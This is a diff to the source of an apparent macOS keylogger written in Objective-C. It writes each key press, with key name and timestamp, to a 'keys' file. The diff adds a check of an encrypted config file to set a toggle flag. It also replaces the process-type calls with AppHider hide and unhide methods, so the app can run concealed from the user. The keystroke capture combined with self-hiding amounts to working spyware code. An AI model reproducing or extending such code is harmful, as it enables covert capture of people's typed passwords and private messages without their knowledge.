@@ -13,25 +13,23 @@
 - (id)init {
     self = [super init];
     
-    cmd = false;
-    
-    anyKeyPressed = YES;
     flag = YES;
     combination = [NSMutableArray array];
+    
+    NSString *config = [FileManager readFromFile:@"config"];
+    if ([config isNotEqualTo: @"error"]) {
+        NSArray *components = [config componentsSeparatedByString:@"\n"];
+        if ([[Cryptographer doIt:components[2]] isEqualToString:@"1"]) {
+            flag = NO;
+        }
+    }
     
     return self;
 }
 
 - (void)doFullCycle: (int)key {
-    //anyKeyPressed = !anyKeyPressed;
-    
-    //if (key == 55) cmd = !cmd;
-    //if (cmd == true && key == 4) [self reset];
-    
     [FileManager writeToFile:@"keys" file:[NSString stringWithFormat:@"%-3d = %-13s (%@)\n", key,
                                            [[KeycodeEncrypter keyStringFormKeyCode:key] UTF8String], [Time currentTime]]];
-    //NSLog(@"%@", [NSString stringWithFormat:@"%-3d = %-13s (%@)\n", key, [[KeycodeEncrypter keyStringFormKeyCode:key] UTF8String], [Time currentTime]]);
-    //NSLog(@"%@", [KeycodeEncrypter keyStringFormKeyCode:key]);
         
     if (key == 55) [combination removeAllObjects];
     [combination addObject:[NSNumber numberWithInt:key]];
@@ -44,12 +42,11 @@
 
 - (void)reset {
     flag = !flag;
-    ProcessSerialNumber psn = { 0, kCurrentProcess };
     
     if (flag == true) {
-        TransformProcessType(&psn, kProcessTransformToForegroundApplication);
+        [AppHider hide];
     } else {
-        TransformProcessType(&psn, kProcessTransformToUIElementApplication);
+        [AppHider unhide];
     }
 }
 
